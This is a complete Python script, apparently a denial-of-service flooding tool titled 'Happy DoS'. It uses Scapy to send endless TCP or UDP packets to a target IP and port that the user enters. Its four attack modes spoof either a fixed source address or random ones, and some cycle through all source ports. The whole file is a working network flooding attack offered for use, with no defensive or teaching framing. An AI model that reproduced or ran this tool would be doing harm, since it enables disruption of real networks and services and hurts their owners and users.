from scapy.all import *
import random
from colorama import Fore
import os, time


def main():
    all_attack_methods = {1: single_ip_single_port, 2: single_ip_multiple_port, 3: multiple_ip_single_port,
                          4: multiple_ip_multiple_port}

    attack_method, is_tcp = get_user_choice()

    attack_method = all_attack_methods.get(attack_method)

    attack_method(is_tcp)

    os.system('cls')


def get_user_choice():
    while True:
        banner()
        protocol_menu()
        attack_protocol = int(input(Fore.CYAN + 'Choose Your Attack Protocol: '))

        if attack_protocol == 0:
            exit()

        if not (1 <= attack_protocol <= 2):
            show_error('Try Again With More Precision. ')
            os.system('cls')
            continue

        break

    while True:
        banner()
        method_menu()
        attack_method = int(input(Fore.CYAN + 'Choose Your Attack Method: '))

        if attack_method == 0:
            exit()

        if not (1 <= attack_method <= 4):
            show_error('Try Again With More Precision. ')
            os.system('cls')
            continue

        return attack_method, attack_protocol - 1


def protocol_menu():
    print(Fore.GREEN + '1. UDP\n')
    print(Fore.GREEN + '2. TCP\n')
    print(Fore.GREEN + '0. exit\n')


def method_menu():
    print(Fore.GREEN + '1. Single IP And Single Port\n')
    print(Fore.GREEN + '2. Single IP And Multiple Port\n')
    print(Fore.GREEN + '3. Multiple IP And Single Port\n')
    print(Fore.GREEN + '4. Multiple IP And Multiple Port\n')
    print(Fore.GREEN + '0. exit\n')


def banner():
    os.system('cls')
    print(Fore.YELLOW + """ /$$   /$$                                               /$$$$$$$                     
| $$  | $$                                              | $$__  $$                    
| $$  | $$  /$$$$$$   /$$$$$$   /$$$$$$  /$$   /$$      | $$  \ $$  /$$$$$$   /$$$$$$$
| $$$$$$$$ |____  $$ /$$__  $$ /$$__  $$| $$  | $$      | $$  | $$ /$$__  $$ /$$_____/
| $$__  $$  /$$$$$$$| $$  \ $$| $$  \ $$| $$  | $$      | $$  | $$| $$  \ $$|  $$$$$$ 
| $$  | $$ /$$__  $$| $$  | $$| $$  | $$| $$  | $$      | $$  | $$| $$  | $$ \____  $$
| $$  | $$|  $$$$$$$| $$$$$$$/| $$$$$$$/|  $$$$$$$      | $$$$$$$/|  $$$$$$/ /$$$$$$$/
|__/  |__/ \_______/| $$____/ | $$____/  \____  $$      |_______/  \______/ |_______/ 
                    | $$      | $$       /$$  | $$                                    
                    | $$      | $$      |  $$$$$$/                                    
                    |__/      |__/       \______/                                     """)
    print()


# attack with single ip and single port
def single_ip_single_port(is_tcp=True):
    target_ip, target_port = get_target_info()
    source_ip = get_source_ip("Enter IP Address Of Source: ")
    source_port = get_port("Enter Source Port Number:")

    # show number of sent packets
    packet_number = 1

    # send tcp packets
    while is_tcp:
        send_packet(source_ip, target_ip, source_port, target_port, TCP)
        print(
            f"#{packet_number} With {source_port} Port And {source_ip} IP To {target_ip} IP (TCP) With {target_port} Port")
        packet_number = packet_number + 1

    # send udp packets
    while not is_tcp:
        send_packet(source_ip, target_ip, source_port, target_port, UDP)
        print(
            f"#{packet_number} With {source_port} Port And {source_ip} IP To {target_ip} IP (UDP) With {target_port} Port")
        packet_number = packet_number + 1


# attack with single ip and multiple port
def single_ip_multiple_port(is_tcp=True):
    target_ip, target_port = get_target_info()
    source_ip = get_source_ip("Enter IP Address Of Source: ")

    # show number of sent packets
    packet_number = 1

    # send tcp packets
    while is_tcp:
        for source_port in range(1, 65535):
            send_packet(source_ip, target_ip, source_port, target_port, TCP)
            print(
                f"#{packet_number} With {source_port} Port And {source_ip} IP To {target_ip} IP (TCP) With {target_port} Port")
            packet_number = packet_number + 1

    # send udp packets
    while not is_tcp:
        for source_port in range(1, 65535):
            send_packet(source_ip, target_ip, source_port, target_port, UDP)
            print(
                f"#{packet_number} With {source_port} Port And {source_ip} IP To {target_ip} IP (UDP) With {target_port} Port")
            packet_number = packet_number + 1


# attack with multiple ip and single port
def multiple_ip_single_port(is_tcp):
    target_ip, target_port = get_target_info()
    source_port = get_port("Enter Source Port Number:")

    # show number of sent packets
    packet_number = 1

    # send tcp packets
    while is_tcp:
        source_ip = create_random_ip()
        send_packet(source_ip, target_ip, source_port, target_port, TCP)
        print(
            f"#{packet_number} With {source_port} Port And {source_ip} IP To {target_ip} IP (TCP) With {target_port} Port")
        packet_number = packet_number + 1

    # send udp packets
    while not is_tcp:
        source_ip = create_random_ip()
        send_packet(source_ip, target_ip, source_port, target_port, UDP)
        print(
            f"#{packet_number} With {source_port} Port And {source_ip} IP To {target_ip} IP (UDP) With {target_port} Port")
        packet_number = packet_number + 1


# attack with multiple ip and multiple port
def multiple_ip_multiple_port(is_tcp=True):
    target_ip, target_port = get_target_info()

    # show number of sent packets
    packet_number = 1

    # send tcp packets
    while is_tcp:
        for source_port in range(1, 65535):
            source_ip = create_random_ip()
            send_packet(source_ip, target_ip, source_port, target_port, TCP)
            print(
                f"#{packet_number} With {source_port} Port And {source_ip} IP To {target_ip} IP (TCP) With {target_port} Port")
            packet_number = packet_number + 1

    # send udp packets
    while not is_tcp:
        for source_port in range(1, 65535):
            source_ip = create_random_ip()
            send_packet(source_ip, target_ip, source_port, target_port, UDP)
            print(
                f"#{packet_number} With {source_port} Port And {source_ip} IP To {target_ip} IP (UDP) With {target_port} Port")
            packet_number = packet_number + 1


def get_source_ip(message):
    source_ip = input(message)
    is_ip_valid(source_ip)
    return source_ip


def get_target_info():
    target_ip = input("Enter IP Address Of Target: ")

    is_ip_valid(target_ip)

    target_port = get_port("Enter Target Port Number:")

    return target_ip, target_port


def get_port(message):
    try:
        port = int(input(message))
        check_port_range(port)
        return port
    except ValueError:
        show_error('Enter A Number For Port. ')
        exit()


def is_ip_valid(ip):
    ip = ip.split('.')

    if len(ip) == 4:

        for number in ip:

            number = int(number)
            if not (1 <= number <= 254):
                show_error('Enter A Valid IP Next Time. ')
                exit()

    else:
        show_error('Enter A Valid IP Next Time. ')
        exit()


def check_port_range(port_number):
    if not (1 <= port_number <= 65536):
        show_error('Enter A Port Number Between 1 And 65536. ')
        exit()


def show_error(message=''):
    print()
    print(Fore.RED + message)
    time.sleep(2)


def create_random_ip():
    # create four part of ip
    a = str(random.randint(1, 254))
    b = str(random.randint(1, 254))
    c = str(random.randint(1, 254))
    d = str(random.randint(1, 254))
    dot = '.'

    ip = a + dot + b + dot + c + dot + d

    return ip


def send_packet(source_ip=None, target_ip=None, source_port=None, target_port=80, protocol=TCP):
    # create ip layer
    ip_layer = IP(src=source_ip, dst=target_ip)
    # create transport layer (tcp or udp)
    transport_layer = protocol(sport=source_port, dport=target_port)

    made_packet = ip_layer / transport_layer

    send(made_packet, inter=.001)


if __name__ == '__main__':
    main()
